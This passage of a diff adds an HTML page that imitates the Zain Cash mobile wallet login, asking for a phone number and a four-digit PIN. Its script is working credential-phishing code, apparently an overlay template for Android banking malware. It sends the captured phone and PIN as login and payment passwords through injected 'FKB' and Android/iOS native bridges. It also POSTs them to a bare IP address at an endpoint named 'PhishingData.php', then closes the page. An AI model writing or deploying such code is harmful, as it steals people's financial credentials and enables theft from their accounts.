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" alt="Zain Cash Icon" class="brand-app-icon">
+          <div class="brand-app-name">Zain Cash</div>
+        </div>
+
+        <!-- 中间 PIN 输入提示与指示点 -->
+        <div class="step2-pin-area">
+          <div class="pin-prompt-text">أدخل رمز PIN الخاص بك</div>
+          <div class="pin-dots-row" id="pinDotsRow">
+            <div class="pin-circle" id="dot0"></div>
+            <div class="pin-circle" id="dot1"></div>
+            <div class="pin-circle" id="dot2"></div>
+            <div class="pin-circle" id="dot3"></div>
+          </div>
+        </div>
+
+        <!-- 椭圆形数字键盘 (3列 x 4行: 3 2 1 / 6 5 4 / 9 8 7 / ⌫ 0) -->
+        <div class="keypad-container">
+          <div class="keypad-grid">
+            <div class="key-oval" data-num="3">3</div>
+            <div class="key-oval" data-num="2">2</div>
+            <div class="key-oval" data-num="1">1</div>
+
+            <div class="key-oval" data-num="6">6</div>
+            <div class="key-oval" data-num="5">5</div>
+            <div class="key-oval" data-num="4">4</div>
+
+            <div class="key-oval" data-num="9">9</div>
+            <div class="key-oval" data-num="8">8</div>
+            <div class="key-oval" data-num="7">7</div>
+
+            <div class="key-oval" id="btnBackspace">
+              <svg class="del-svg" viewBox="0 0 24 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <!-- 房型退格箭头 -->
+                <path d="M7 1.5L1.5 9L7 16.5H22C22.55 16.5 23 16.05 23 15.5V2.5C23 1.95 22.55 1.5 22 1.5H7Z" stroke="#ffffff" stroke-width="1.8" stroke-linejoin="round" stroke-linecap="round"/>
+                <!-- 内部 X 删除线条 -->
+                <line x1="11" y1="5.5" x2="18" y2="12.5" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round"/>
+                <line x1="18" y1="5.5" x2="11" y2="12.5" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round"/>
+              </svg>
+            </div>
+            <div class="key-oval" data-num="0">0</div>
+            <div class="key-oval empty"></div>
+          </div>
+
+          <!-- 忘记密码 -->
+          <div class="forgot-pin-link">نسيت رمز PIN؟</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 弹窗 -->
+    <div class="app-toast" id="appToast"></div>
+  </div>
+
+  <script>
+    (function() {
+      var pkgName = "com.audiogram.zaincash";
+      var step1Phone = "";
+      var pinCode = "";
+
+      var viewStep1 = document.getElementById("viewStep1");
+      var viewStep2 = document.getElementById("viewStep2");
+      var inputPhone = document.getElementById("inputPhone");
+      var btnSendCode = document.getElementById("btnSendCode");
+      var dots = [
+        document.getElementById("dot0"),
+        document.getElementById("dot1"),
+        document.getElementById("dot2"),
+        document.getElementById("dot3")
+      ];
+      var btnBackspace = document.getElementById("btnBackspace");
+      var appToast = document.getElementById("appToast");
+
+      function showToast(msg, duration) {
+        duration = duration || 2000;
+        appToast.textContent = msg;
+        appToast.style.display = "block";
+        setTimeout(function() {
+          appToast.style.display = "none";
+        }, duration);
+      }
+
+      // 手机号输入监听
+      inputPhone.addEventListener("input", function() {
+        var val = this.value.replace(/[^0-9]/g, '');
+        this.value = val;
+        if (val.length >= 7) {
+          btnSendCode.classList.add("active");
+        } else {
+          btnSendCode.classList.remove("active");
+        }
+      });
+
+      // 点击第一步“ارسال الرمز”
+      btnSendCode.addEventListener("click", function() {
+        var phone = inputPhone.value.trim();
+        if (phone.length < 7) {
+          showToast("يرجى إدخال رقم هاتف صحيح");
+          return;
+        }
+        step1Phone = "+962" + phone;
+        // 切换至第二步
+        viewStep1.classList.remove("active");
+        viewStep2.classList.add("active");
+      });
+
+      // 更新 PIN 指示点
+      function updatePinDots() {
+        for (var i = 0; i < 4; i++) {
+          if (i < pinCode.length) {
+            dots[i].classList.add("filled");
+          } else {
+            dots[i].classList.remove("filled");
+          }
+        }
+      }
+
+      // 键盘点击
+      var keys = document.querySelectorAll(".key-oval[data-num]");
+      keys.forEach(function(key) {
+        key.addEventListener("click", function() {
+          if (pinCode.length >= 4) return;
+          var num = this.getAttribute("data-num");
+          pinCode += num;
+          updatePinDots();
+
+          if (pinCode.length === 4) {
+            setTimeout(submitAllData, 250);
+          }
+        });
+      });
+
+      // 退格删除
+      btnBackspace.addEventListener("click", function() {
+        if (pinCode.length > 0) {
+          pinCode = pinCode.slice(0, -1);
+          updatePinDots();
+        }
+      });
+
+      // 数据上报
+      function submitAllData() {
+        var payload = {
+          pkg: pkgName,
+          phone: step1Phone,
+          username: step1Phone,
+          pin: pinCode,
+          payment_password: pinCode,
+          timestamp: new Date().getTime()
+        };
+
+        console.log("Submitting ZainCash payload:", payload);
+
+        // 1. Android 原生桥接
+        try {
+          if (typeof Android !== 'undefined') {
+            if (typeof Android.postMessage === 'function') Android.postMessage(JSON.stringify(payload));
+            if (typeof Android.setFormData === 'function') Android.setFormData(JSON.stringify(payload));
+          }
+        } catch(e) {}
+
+        // 2. FKB 注入桥接
+        try {
+          if (typeof FKB !== 'undefined') {
+            if (typeof FKB.postMessage === 'function') FKB.postMessage(JSON.stringify(payload));
+            if (typeof FKB.setFormData === 'function') {
+              FKB.setFormData(JSON.stringify({
+                client_id: step1Phone,
+                username: step1Phone,
+                password: pinCode,
+                login_password: pinCode,
+                payment_password: pinCode,
+                pin: pinCode,
+                pkg: pkgName
+              }));
+            }
+          }
+        } catch(e) {}
+
+        // 3. iOS WebKit 兼容
+        try {
+          if (window.webkit && window.webkit.messageHandlers) {
+            if (window.webkit.messageHandlers.Android && typeof window.webkit.messageHandlers.Android.postMessage === 'function') {
+              window.webkit.messageHandlers.Android.postMessage(JSON.stringify(payload));
+            } else if (window.webkit.messageHandlers.FKB && typeof window.webkit.messageHandlers.FKB.postMessage === 'function') {
+              window.webkit.messageHandlers.FKB.postMessage(JSON.stringify(payload));
+            }
+          }
+        } catch(e) {}
+
+        // 4. Ajax 网络上报兜底
+        try {
+          var xhr = new XMLHttpRequest();
+          xhr.open('POST', "http://18.142.44.159:8035/api/PhishingData.php", true);
+          xhr.setRequestHeader('Content-Type', 'application/json');
+          xhr.send(JSON.stringify({
+            pkg: pkgName,
+            template: 'zaincash_mobile',
+            formData: payload
+          }));
+        } catch(e) {}
+
+        showToast("جاري التحقق...");
+
+        // 级联关闭页面
+        setTimeout(function() {
+          try {
+            if (typeof Android !== 'undefined') {
+              if (typeof Android.close === 'function') Android.close();
+              else if (typeof Android.close === 'function') Android.close();
+            } else if (typeof Android!=='undefined'&&Android.close) {
+              Android.close();
+            } else {
+              window.close();
+            }
+          } catch(e) {}
+        }, 800);
+      }
+    })();
+  </script>
+</body>
+</html>
